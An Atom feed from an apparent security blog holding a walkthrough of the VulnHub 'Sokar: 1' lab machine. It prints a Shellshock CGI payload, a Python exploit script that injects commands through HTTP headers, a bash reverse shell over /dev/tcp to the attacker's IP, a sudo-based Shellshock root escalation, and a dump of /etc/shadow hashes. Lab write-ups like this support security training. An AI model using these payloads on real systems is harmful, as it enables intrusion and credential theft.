<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: sokar | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/sokar/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2015-12-08T05:18:37-05:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Sokar: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/07/07/vulnhub-sokar-1/"/>
    <updated>2015-07-07T02:41:59-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/07/07/vulnhub-sokar-1</id>
    <content type="html"><![CDATA[<p><strong>Sokar</strong> is created by <a href="http://rastamouse.me/">Rasta Mouse</a> and it also is the first competition in 2015 run by VulnHub team.</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sokar-1,113/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: Sokar (<em>10.10.10.145/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Shellshock (Bash bug) give attacker a way to break in and also get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Shellshock vulnerability detect and check [<font color="FF8000">wget</font>]</li>
<li>Analysis and write script to exploit shellshock bug</li>
<li>Poked around in the file system and found sensitive information</li>
<li>Hijack executable program to get reverse shell</li>
<li>Exploit shellshock bug to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="http://www.gnu.org/software/wget/">wget</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.145 in this case).</p>

<p><img class="left" src="/downloads/Sokar1/1.png"></p>

<p>10.10.10.145 is our Target!</p>

<p>Then run NMAP scan to detect opening ports/running services on the target. From the result, found apache 2.2.15 is running on port 591 and the target OS is CentOS Linux.</p>

<p><code>nmap -sV -v -O -A -T5 -p- 10.10.10.145</code></p>

<p><img class="left" src="/downloads/Sokar1/2.png"></p>

<p>Then I open iceweasel browser to have a close look at port 591.</p>

<p><img class="left" src="/downloads/Sokar1/3.png"></p>

<p>From the content displayed, we know the server is running system command: <code>netstat</code> and <code>iostat</code></p>

<p>From the source code, we found an URL: <code>http://10.10.10.145:591/cgi-bin/cat</code></p>

<h3>It&rsquo;s time to try shellshock (bash bug)</h3>

<p>After googled <code>shellshock</code>, I found some topics talking about how to test/exploit shellshock vulnerability in CGI. The following command is picked from <a href="http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited">one</a> of them.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -U &ldquo;() { test;};echo \"Content-type: text/plain\&rdquo;; echo; echo; /bin/cat /etc/passwd" &lt;a href="http://10.10.10.145:591/cgi-bin/cat">http://10.10.10.145:591/cgi-bin/cat&lt;/a> -O /temp.txt</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/Sokar1/4.png"></p>

<p>It works! shellshock vulnerable. Also, two users found: <code>bynarr</code> and <code>apophis</code></p>

<p>Here I wrote a small python script to save my life.</p>

<p><figure class='code'><figcaption><span>sokar.py  (sokar.py)</span> <a href='/downloads/code/sokar.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">httplib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">urllib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">str_usage</span> <span class="o">=</span> <span class="s">&quot;Usage: </span><span class="si">%s</span><span class="s"> &lt;command&gt;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="n">str_example</span> <span class="o">=</span> <span class="s">&quot;Example: </span><span class="si">%s</span><span class="s"> </span><span class="se">\&quot;</span><span class="s">/bin/cat /etc/passwd</span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;10.10.10.145&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">591</span>
</span><span class='line'><span class="n">uri</span> <span class="o">=</span> <span class="s">&quot;/cgi-bin/cat&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">):</span>
</span><span class='line'>	<span class="k">print</span> <span class="n">str_usage</span>
</span><span class='line'>	<span class="k">print</span> <span class="n">str_example</span>
</span><span class='line'>	<span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">exp</span> <span class="o">=</span> <span class="s">&quot;() { test;};echo </span><span class="se">\&quot;</span><span class="s">Content-type: text/plain</span><span class="se">\&quot;</span><span class="s">; echo; echo; &quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="c"># the following exp is used to write reverse shell code into the file /home/bynarr/iostat</span>
</span><span class='line'><span class="c">#exp = &quot;() { test;};echo \&quot;Content-type: text/plain\&quot;; echo; echo; /bin/echo -e &#39;#!/bin/bash\\n/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.131/51242 0&gt;&amp;1&#39; &gt; /home/bynarr/iostat&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="n">exp</span>
</span><span class='line'><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">&quot;test&quot;</span><span class="p">:</span><span class="n">exp</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">&quot;GET&quot;</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">reason</span>
</span><span class='line'>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'><span class="k">print</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>by using <code>sokar.py</code> script, I poked around the system and found something interesting.</p>

<p><img class="left" src="/downloads/Sokar1/5.png"></p>

<p><img class="left" src="/downloads/Sokar1/6.png"></p>

<p>Here we go, I got the password (<font color="red"><em>fruity</em></font>) for user <code>bynarr</code> and notice that we only can got out to port <font color="red">51242</font> from the server.</p>

<p><img class="left" src="/downloads/Sokar1/7.png"></p>

<p>Another notice, <code>.</code> has been set in environment variable <code>$PATH</code>, which means when run a program the system will check the current user path first. This leave us a chance to hijack the program and make a reverse shell back to my Kali.</p>

<p>Then I changed the exp payload in my python script to write a bash script into /home/bynarr/iostat (iostat is the hijack target).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">exp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;()</span> <span class="p">{</span> <span class="n">test</span><span class="p">;};</span><span class="n">echo</span> \<span class="s">&quot;Content-type: text/plain\&amp;rdquo;; echo; echo; /bin/echo -e &amp;lsquo;#!/bin/bash</span><span class="se">\n</span><span class="s">/bin/bash -i &gt;&amp;amp; /dev/tcp/10.10.10.131/51242 0&gt;&amp;amp;1&amp;rsquo; &gt; /home/bynarr/iostat&quot;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then use my script to grant the new fake <code>iostat</code> to executable.</p>

<p><img class="left" src="/downloads/Sokar1/8.png"></p>

<p>Now setup <code>NC</code> on my Kali to listen on port <font color="red">51242</font>, after waiting for seconds, I got a shell with <em>bynarr</em> privilege!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -lvnp 51242
</span><span class='line'>listening on [any] 51242 &hellip;
</span><span class='line'>connect to [10.10.10.131] from (UNKNOWN) [10.10.10.145] 56650
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>[bynarr@sokar ~]$ id
</span><span class='line'>id
</span><span class='line'>uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
</span><span class='line'>[bynarr@sokar ~]$ pwd
</span><span class='line'>pwd
</span><span class='line'>/home/bynarr
</span><span class='line'>[bynarr@sokar ~]$ cat /proc/version
</span><span class='line'>cat /proc/version
</span><span class='line'>Linux version 2.6.32-504.1.3.el6.x86_64 (&lt;a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x6d;&#x6f;&#x63;&#107;&#x62;&#117;&#105;&#108;&#100;&#x40;&#x63;&#54;&#98;&#x39;&#46;&#98;&#115;&#x79;&#x73;&#x2e;&#x64;&#101;&#118;&#x2e;&#x63;&#101;&#x6e;&#x74;&#111;&#115;&#46;&#x6f;&#114;&#x67;">&#x6d;&#x6f;&#99;&#107;&#98;&#117;&#x69;&#x6c;&#100;&#x40;&#99;&#54;&#98;&#57;&#x2e;&#x62;&#x73;&#121;&#x73;&#46;&#100;&#x65;&#118;&#x2e;&#99;&#101;&#110;&#116;&#x6f;&#115;&#x2e;&#111;&#x72;&#x67;&lt;/a>) (gcc version 4.4.7 20120313 (Red Hat 4.4.7-11) (GCC) ) #1 SMP Tue Nov 11 17:57:25 UTC 2014
</span><span class='line'>[bynarr@sokar ~]$ ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 48
</span><span class='line'>drwxrwxrwx. 2 bynarr bynarr  4096 Jul  7 17:20 .
</span><span class='line'>drwxr-xr-x. 4 root   root    4096 Dec 30  2014 ..
</span><span class='line'>-rw&mdash;&mdash;-. 1 bynarr bynarr  4982 Jul  7 17:13 .bash_history
</span><span class='line'>-rw-r&ndash;r&ndash;. 1 bynarr bynarr    18 Feb 21  2013 .bash_logout
</span><span class='line'>-rw-r&ndash;r&ndash;. 1 bynarr bynarr   178 Nov 12  2014 .bash_profile
</span><span class='line'>-rw-r&ndash;r&ndash;. 1 bynarr bynarr   124 Feb 21  2013 .bashrc
</span><span class='line'>-rwxr-xr-x  1 apache apache    61 Jul  7 16:09 iostat
</span><span class='line'>-rwxr-xr-x  1 root   root     368 Jan 27 19:14 lime
</span><span class='line'>-rw&mdash;&mdash;-  1 root   root   10728 Nov 13  2014 lime.ko</span></code></pre></td></tr></table></div></figure></p>

<p>I run command <code>sudo -l</code> to check the allowed commands for user bynarr.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries for bynarr on this host:
</span><span class='line'>    !requiretty, visiblepw, always_set_home, env_reset, env_keep=&ldquo;COLORS
</span><span class='line'>    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&rdquo;, env_keep+=&ldquo;MAIL PS1
</span><span class='line'>    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&rdquo;, env_keep+=&ldquo;LC_COLLATE
</span><span class='line'>    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&rdquo;, env_keep+=&ldquo;LC_MONETARY
</span><span class='line'>    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&rdquo;, env_keep+=&ldquo;LC_TIME LC_ALL
</span><span class='line'>    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&rdquo;,
</span><span class='line'>    secure_path=/sbin:/bin:/usr/sbin:/usr/bin&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>User bynarr may run the following commands on this host:
</span><span class='line'>    (ALL) NOPASSWD: /home/bynarr/lime
</span><span class='line'>[bynarr@sokar ~]$ sudo LANG=&lsquo;() { :;}; /bin/bash&rsquo; /home/bynarr/lime
</span><span class='line'>sudo LANG=&lsquo;() { :;}; /bin/bash&rsquo; /home/bynarr/lime
</span><span class='line'>sudo: sorry, you are not allowed to set the following environment variables: LANG</span></code></pre></td></tr></table></div></figure></p>

<p>From the output, I noticed that executable program lime is owned by root but <em>bynarr</em> can run it.</p>

<p>Due to the server is vulnerable to shellshock, I use the following command (found in <a href="http://stackoverflow.com/questions/26041934/how-does-cve-2014-7169-work-breakdown-of-the-test-code">here</a>) to double check if it can be exploited locally.</p>

<p><code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ env x=&lsquo;() { :;}; echo vulnerable&rsquo; bash -c &ldquo;echo this is a test&rdquo;
</span><span class='line'>&lt; { :;}; echo vulnerable' bash -c &ldquo;echo this is a test&rdquo;                    &lt;br/>
</span><span class='line'>vulnerable
</span><span class='line'>this is a test</span></code></pre></td></tr></table></div></figure></p>

<p>Yes it is vulnerable! From the previous <code>sudo -l</code> output, there are couple of environment variables can be used to exploit.</p>

<p>Here I use variable <code>HOSTNAME</code>.</p>

<p><code>sudo HOSTNAME='() { :;}; /bin/bash' /home/bynarr/lime</code></p>

<p>the password for bynarr is <code>fruity</code> which we found it before.</p>

<p>Now we get ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ sudo HOSTNAME=&lsquo;() { :;}; /bin/bash&rsquo; /home/bynarr/lime
</span><span class='line'>sudo HOSTNAME=&lsquo;() { :;}; /bin/bash&rsquo; /home/bynarr/lime
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
</span><span class='line'>[root@sokar bynarr]# id
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'>[root@sokar bynarr]# pwd
</span><span class='line'>pwd
</span><span class='line'>/home/bynarr
</span><span class='line'>[root@sokar root]#cat /etc/shadow
</span><span class='line'>cat /etc/shadow
</span><span class='line'>root:$6$cWQYjirZ$rADNjUFSiHmYp.UVdt4WYlmALhMXdkg9//9yuodQ2TFfiEWlAO0J6PRKesEfvu.3dfDb.7gTGgl/jesvFWs7l0:16434:0:99999:7:::
</span><span class='line'>bin:&lt;em>:15628:0:99999:7:::
</span><span class='line'>daemon:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>adm:&lt;em>:15628:0:99999:7:::
</span><span class='line'>lp:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>sync:&lt;em>:15628:0:99999:7:::
</span><span class='line'>shutdown:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>halt:&lt;em>:15628:0:99999:7:::
</span><span class='line'>mail:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>uucp:&lt;em>:15628:0:99999:7:::
</span><span class='line'>operator:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>games:&lt;em>:15628:0:99999:7:::
</span><span class='line'>gopher:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>&lt;a href="ftp:*:15628:0:99999:7:::">ftp:*:15628:0:99999:7:::&lt;/a>
</span><span class='line'>nobody:*:15628:0:99999:7:::
</span><span class='line'>vcsa:!!:16386::::::
</span><span class='line'>saslauth:!!:16386::::::
</span><span class='line'>postfix:!!:16386::::::
</span><span class='line'>sshd:!!:16386::::::
</span><span class='line'>bynarr:$6$UVZfMym7$9FFtl9Ky3ABFGErQlpQsKNOmAycJn4MlSRVHsSgVupDstQOifqqu3LvGwf3wmBvmfvh0IslwMo4/mhZ3qnVrM/:16434:0:99999:7:::
</span><span class='line'>apache:!!:16386::::::
</span><span class='line'>apophis:$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
</span><span class='line'>[root@sokar bynarr]# cd /root
</span><span class='line'>cd /root
</span><span class='line'>[root@sokar root]# ls
</span><span class='line'>ls
</span><span class='line'>build.c  flag
</span><span class='line'>[root@sokar root]# cat flag
</span><span class='line'>cat flag
</span><span class='line'>                0   0
</span><span class='line'>                |   |
</span><span class='line'>            &lt;em>&lt;strong>&lt;em>|&lt;/em>&lt;/strong>|&lt;/em>&lt;strong>&lt;em>
</span><span class='line'>         0  |~ ~ ~ ~ ~ ~|   0
</span><span class='line'>         |  |   Happy   |   |
</span><span class='line'>      &lt;/em>&lt;/strong>|&lt;strong>|&lt;/strong>&lt;strong>&lt;em>&lt;em>&lt;strong>&lt;strong>&lt;em>|&lt;/em>&lt;/strong>|&lt;/strong>
</span><span class='line'>      |/\/\/\/\/\/\/\/\/\/\/\/|
</span><span class='line'>  0   |    B i r t h d a y    |   0
</span><span class='line'>  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
</span><span class='line'> &lt;/em>|&lt;/em>&lt;/strong>|&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;strong>&lt;strong>&lt;em>|&lt;/em>&lt;/strong>|&lt;/strong>
</span><span class='line'>|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
</span><span class='line'>|                                   |
</span><span class='line'>|     V  u  l  n  H  u  b   ! !     |
</span><span class='line'>| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
</span><span class='line'>|&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>_________________|&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;table>
</span><span class='line'>&lt;thead>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;th> Congratulations on beating Sokar! &lt;/th>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;/thead>
</span><span class='line'>&lt;tbody>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;td>  Massive shoutout to g0tmi1k and  &lt;/td>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;td> the entire community which makes  &lt;/td>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;td>         VulnHub possible!         &lt;/td>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;td>                                   &lt;/td>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;/tbody>
</span><span class='line'>&lt;/table>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;h1>|    rasta_mouse (@_RastaMouse)     |&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
